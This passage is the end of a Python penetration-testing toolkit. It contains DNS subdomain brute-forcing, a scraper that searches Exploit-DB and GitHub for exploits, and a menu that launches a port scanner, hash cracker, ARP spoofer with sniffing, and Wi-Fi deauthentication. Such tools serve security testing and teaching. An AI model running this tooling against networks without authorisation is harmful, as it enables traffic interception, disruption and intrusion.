            print(f"{Colors.RED}[!] Zone transfer failed for all nameservers{Colors.ENDC}")
            return None
        except Exception as e:
            handle_error(f"Error during zone transfer: {e}")
            return None
    
    def subdomain_bruteforce(self, wordlist_path):
        """Bruteforce subdomains"""
        print(f"{Colors.BLUE}[*] Bruteforcing subdomains for {self.domain}{Colors.ENDC}")
        
        try:
            with open(wordlist_path, 'r') as f:
                subdomains = [line.strip() for line in f]
            
            found_subdomains = []
            
            for subdomain in subdomains:
                test_domain = f"{subdomain}.{self.domain}"
                try:
                    answers = dns.resolver.resolve(test_domain, 'A', raise_on_no_answer=False)
                    found_subdomains.append(test_domain)
                    print(f"{Colors.GREEN}[+] Found subdomain: {test_domain}{Colors.ENDC}")
                except:
                    continue
            
            print(f"{Colors.GREEN}[+] Found {len(found_subdomains)} subdomains{Colors.ENDC}")
            return found_subdomains
        except Exception as e:
            handle_error(f"Error during subdomain bruteforce: {e}")
            return []

# ==============================================
# EXPLOIT SEARCH ENGINE
# ==============================================
class ExploitSearcher:
    def __init__(self):
        self.exploitdb_url = "https://www.exploit-db.com/search"
        self.github_url = "https://github.com/search"
    
    def search_exploitdb(self, query, type='exploits'):
        """Search Exploit-DB for exploits"""
        params = {
            'type': type,
            'cve': query if 'CVE' in query else None,
            'q': query
        }
        
        try:
            response = requests.get(self.exploitdb_url, params=params, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            exploits = []
            for row in soup.select('tr.exploitrow'):
                title = row.select_one('.title a')
                author = row.select_one('.author')
                date = row.select_one('.date')
                description = row.select_one('.description')
                
                if title:
                    exploit = {
                        'title': title.text.strip(),
                        'url': title['href'],
                        'author': author.text.strip() if author else 'Unknown',
                        'date': date.text.strip() if date else 'Unknown',
                        'description': description.text.strip() if description else 'No description'
                    }
                    exploits.append(exploit)
            
            return exploits
        except Exception as e:
            handle_error(f"Error searching Exploit-DB: {e}")
            return []
    
    def search_github(self, query):
        """Search GitHub for exploit scripts"""
        params = {'q': query + ' exploit', 'type': 'repositories'}
        
        try:
            response = requests.get(self.github_url, params=params, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            repos = []
            for repo in soup.select('div#search-results a[data-hydro-click]'):
                title = repo.select_one('h3')
                description = repo.select_one('.col-9')
                language = repo.select_one('.d-inline')
                stars = repo.select_one('.muted-link.mr-3')
                
                if title:
                    repository = {
                        'title': title.text.strip(),
                        'url': repo['href'],
                        'description': description.text.strip() if description else 'No description',
                        'language': language.text.strip() if language else 'Unknown',
                        'stars': stars.text.strip() if stars else '0'
                    }
                    repos.append(repository)
            
            return repos
        except Exception as e:
            handle_error(f"Error searching GitHub: {e}")
            return []
    
    def search_all(self, query):
        """Search all sources for exploits"""
        print(f"{Colors.BLUE}[*] Searching for exploits related to: {query}{Colors.ENDC}")
        
        results = {
            'exploitdb': self.search_exploitdb(query),
            'github': self.search_github(query)
        }
        
        total = sum(len(v) for v in results.values())
        print(f"{Colors.GREEN}[*] Found {total} results across all sources{Colors.ENDC}")
        
        return results

# ==============================================
# MAIN MENU
# ==============================================
def display_menu():
    print(f"\n{Colors.BLUE}{'='*50}{Colors.ENDC}")
    print(f"{Colors.GREEN}MAIN MENU{Colors.ENDC}")
    print(f"{Colors.BLUE}{'='*50}{Colors.ENDC}")
    print(f"{Colors.YELLOW}1. Enhanced Port Scanner{Colors.ENDC}")
    print(f"{Colors.YELLOW}2. Network Discovery{Colors.ENDC}")
    print(f"{Colors.YELLOW}3. Vulnerability Scanner{Colors.ENDC}")
    print(f"{Colors.YELLOW}4. Password Cracker{Colors.ENDC}")
    print(f"{Colors.YELLOW}5. ARP Spoofer{Colors.ENDC}")
    print(f"{Colors.YELLOW}6. Packet Sniffer{Colors.ENDC}")
    print(f"{Colors.YELLOW}7. Web Application Testing{Colors.ENDC}")
    print(f"{Colors.YELLOW}8. Wireless Network Analysis{Colors.ENDC}")
    print(f"{Colors.YELLOW}9. DNS Enumeration{Colors.ENDC}")
    print(f"{Colors.YELLOW}10. Exploit Search Engine{Colors.ENDC}")
    print(f"{Colors.YELLOW}11. Password Strength Analyzer{Colors.ENDC}")
    print(f"{Colors.YELLOW}12. Traffic Analyzer{Colors.ENDC}")
    print(f"{Colors.YELLOW}13. Exit{Colors.ENDC}")
    print(f"{Colors.BLUE}{'='*50}{Colors.ENDC}")

def get_user_choice():
    while True:
        try:
            choice = input(f"{Colors.BLUE}Enter your choice (1-13): {Colors.ENDC}")
            return int(choice)
        except ValueError:
            print(f"{Colors.RED}Invalid input. Please enter a number between 1 and 13.{Colors.ENDC}")

def run_tool(choice):
    try:
        if choice == 1:
            # Port Scanner
            target = input(f"{Colors.BLUE}Enter target IP: {Colors.ENDC}")
            scanner = PortScanner(target)
            result = scanner.run_scan()
            print(json.dumps(result, indent=2))
        
        elif choice == 2:
            # Network Discovery
            subnet = input(f"{Colors.BLUE}Enter subnet (e.g., 192.168.1.0/24): {Colors.ENDC}")
            interface = input(f"{Colors.BLUE}Enter interface (default eth0): {Colors.ENDC}") or "eth0"
            scanner = NetworkDiscovery(subnet, interface)
            result = scanner.arp_scan()
            print(json.dumps(result, indent=2))
        
        elif choice == 3:
            # Vulnerability Scanner
            target = input(f"{Colors.BLUE}Enter target URL or IP: {Colors.ENDC}")
            scanner = VulnerabilityScanner(target)
            result = scanner.run_scan()
            print(json.dumps(result, indent=2))
        
        elif choice == 4:
            # Password Cracker
            hash_value = input(f"{Colors.BLUE}Enter hash to crack: {Colors.ENDC}")
            wordlist_path = input(f"{Colors.BLUE}Enter wordlist path: {Colors.ENDC}")
            hash_type = input(f"{Colors.BLUE}Enter hash type (md5, sha1, sha256, sha512, ntlm): {Colors.ENDC}") or "md5"
            cracker = PasswordCracker(hash_value, wordlist_path, hash_type)
            result = cracker.crack()
            print(json.dumps(result, indent=2))
        
        elif choice == 5:
            # ARP Spoofer
            interface = input(f"{Colors.BLUE}Enter interface (default eth0): {Colors.ENDC}") or "eth0"
            spoofer = ARPSpoofer(interface)
            
            if spoofer.start_spoofing(input(f"{Colors.BLUE}Enter target IP: {Colors.ENDC}")):
                spoofer.packet_sniffer()
                spoofer.stop_spoofing()
        
        elif choice == 6:
            # Packet Sniffer
            interface = input(f"{Colors.BLUE}Enter interface (default eth0): {Colors.ENDC}") or "eth0"
            filter_expr = input(f"{Colors.BLUE}Enter filter expression (default ip): {Colors.ENDC}") or "ip"
            sniffer = PacketSniffer(interface, filter_expr)
            sniffer.start_sniffing()
        
        elif choice == 7:
            # Web Application Testing
            target = input(f"{Colors.BLUE}Enter target URL: {Colors.ENDC}")
            tester = WebAppTester(target)
            tester.run_tests()
        
        elif choice == 8:
            # Wireless Network Analysis
            interface = input(f"{Colors.BLUE}Enter wireless interface (default wlan0): {Colors.ENDC}") or "wlan0"
            analyzer = WirelessAnalyzer(interface)
            networks = analyzer.scan_networks(int(input(f"{Colors.BLUE}Enter scan duration in seconds (default 10): {Colors.ENDC}") or "10"))
            
            if networks:
                print(f"\n{Colors.BLUE}Found Networks:{Colors.ENDC}")
                for i, network in enumerate(networks):
                    print(f"{Colors.YELLOW}{i+1}. {network['essid']} - Channel: {network['channel']} - BSSID: {network['bssid']}{Colors.ENDC}")
                
                if input(f"{Colors.BLUE}Attempt deauthentication? (y/n): {Colors.ENDC}").lower() == 'y':
                    net_choice = int(input(f"{Colors.BLUE}Enter network number: {Colors.ENDC}")) - 1
                    bssid = networks[net_choice]['bssid']
                    
                    if input(f"{Colors.BLUE}Enter client MAC (or leave blank to scan): {Colors.ENDC}"):
                        client_mac = input(f"{Colors.BLUE}Enter client MAC: {Colors.ENDC}")
                        analyzer.deauthenticate_client(bssid, client_mac)
                    else:
                        print(f"{Colors.YELLOW}[*] Scanning for clients on {bssid}{Colors.ENDC}")
                        # Implement client scanning here
                        print(f"{Colors.RED}[!] Client scanning not implemented in this version{Colors.ENDC}")
        
        elif choice == 9:
            # DNS Enumeration
            domain = input(f"{Colors.BLUE}Enter domain: {Colors.ENDC}")
            enumerator = DnsEnumerator(domain)
            
            print(f"{Colors.BLUE}1. Enumerate records{Colors.ENDC}")
            print(f"{Colors.BLUE}2. Zone transfer{Colors.ENDC}")
            print(f"{Colors.BLUE}3. Subdomain bruteforce{Colors.ENDC}")
            
            dns_choice = input(f"{Colors.BLUE}Enter choice (1-3): {Colors.ENDC}")
            
            if dns_choice == '1':
                records = enumerator.enumerate_records()
                print(json.dumps(records, indent=2))
            elif dns_choice == '2':
                nameserver = input(f"{Colors.BLUE}Enter nameserver (optional): {Colors.ENDC}")
                result = enumerator.zone_transfer(nameserver)
                print(json.dumps(result, indent=2))
            elif dns_choice == '3':
                wordlist_path = input(f"{Colors.BLUE}Enter wordlist path: {Colors.ENDC}")
                result = enumerator.subdomain_bruteforce(wordlist_path)
                print(json.dumps(result, indent=2))
        
        elif choice == 10:
            # Exploit Search
            query = input(f"{Colors.BLUE}Enter search query: {Colors.ENDC}")
            searcher = ExploitSearcher()
            results = searcher.search_all(query)
            
            print(f"\n{Colors.BLUE}Exploit-DB Results:{Colors.ENDC}")
            for exploit in results['exploitdb'][:3]:
                print(f"  {Colors.YELLOW}{exploit['title']} - {exploit['author']} ({exploit['date']}){Colors.ENDC}")
            
            print(f"\n{Colors.BLUE}GitHub Repositories:{Colors.ENDC}")
            for repo in results['github'][:3]:
                print(f"  {Colors.YELLOW}{repo['title']} - {repo['language']} ({repo['stars']} stars){Colors.ENDC}")
        
        elif choice == 11:
            # Password Strength Analyzer
            analyzer = PasswordStrengthAnalyzer()
            passwords = input(f"{Colors.BLUE}Enter passwords (comma-separated): {Colors.ENDC}").split(',')
            results = analyzer.batch_analyze([p.strip() for p in passwords])
            report = analyzer.generate_report(results)
            print(json.dumps(report, indent=2))
        
        elif choice == 12:
            # Traffic Analyzer
            interface = input(f"{Colors.BLUE}Enter interface (default eth0): {Colors.ENDC}") or "eth0"
            duration = input(f"{Colors.BLUE}Enter analysis duration in seconds (default 30): {Colors.ENDC}") or "30"
            analyzer = TrafficAnalyzer(interface, int(duration))
            report = analyzer.start_analysis()
            print(json.dumps(report, indent=2))
        
        elif choice == 13:
            print(f"{Colors.GREEN}Exiting...{Colors.ENDC}")
            return False
        
        else:
            print(f"{Colors.RED}Invalid choice. Please select 1-13.{Colors.ENDC}")
    
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Operation cancelled by user.{Colors.ENDC}")
    except Exception as e:
        handle_error(f"Error running tool: {e}")
    
    return True

# ==============================================
# MAIN EXECUTION
# ==============================================
def main():
    print_banner()
    
    while True:
        display_menu()
        choice = get_user_choice()
        
        if not run_tool(choice):
            break
    
    print(f"{Colors.GREEN}Thank you for using the Advanced Ethical Hacking Toolkit!{Colors.ENDC}")

if __name__ == "__main__":
    main()
